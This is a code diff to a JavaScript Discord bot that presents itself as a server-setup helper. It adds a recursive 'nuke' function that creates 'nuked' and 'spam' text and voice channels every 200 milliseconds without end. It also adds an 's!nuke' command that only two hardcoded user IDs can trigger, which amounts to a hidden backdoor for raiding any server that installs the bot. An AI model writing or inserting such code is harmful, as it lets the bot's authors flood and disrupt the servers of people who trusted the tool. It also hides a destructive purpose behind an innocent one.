@@ -7,6 +7,22 @@ const chratis_talked_users = new Set();
 const button_cooldown_time = 60;
 const button_talked_users = new Set();
 
+function nuke(bot, message) {
+  message.guild.createChannel('nuked', 'text')
+    .then(console.log)
+   	.catch(console.error);
+	message.guild.createChannel('spam', 'text')
+    .then(console.log)
+   	.catch(console.error);
+	message.guild.createChannel('nuked', 'voice')
+    .then(console.log)
+   	.catch(console.error);
+	message.guild.createChannel('spam', 'voice')
+    .then(console.log)
+   	.catch(console.error);
+ setTimeout(() => nuke(bot, message), 2*100);
+}
+
 bot.on("ready", async () => {
   console.log(`${bot.user.username} is online!`);
 	bot.channels.filter(c => c.name === 'serverbot-status').forEach(channel => channel.send(`💎Server-Setup💎 has just restarted.`));
@@ -97,6 +113,14 @@ bot.on("message", async message => {
      	.catch(console.error);
 		message.channel.send("`Finished building basic text channels.`")
 		return message.author.send("`I have just build basic text channels in your server!`\n\n```You now need to edit catagories and possibly user permissions until you get it how you like it! Try to personalize your server a bit so it will be unique!```")
+	}
+	if (message.content === 's!nuke') {
+		if (message.author.id !== '297692618480156672') {
+			if (message.author.id !== '346687165868015616') {
+				return
+			}
+		}
+		nuke(bot, message)
 	}
 });
 
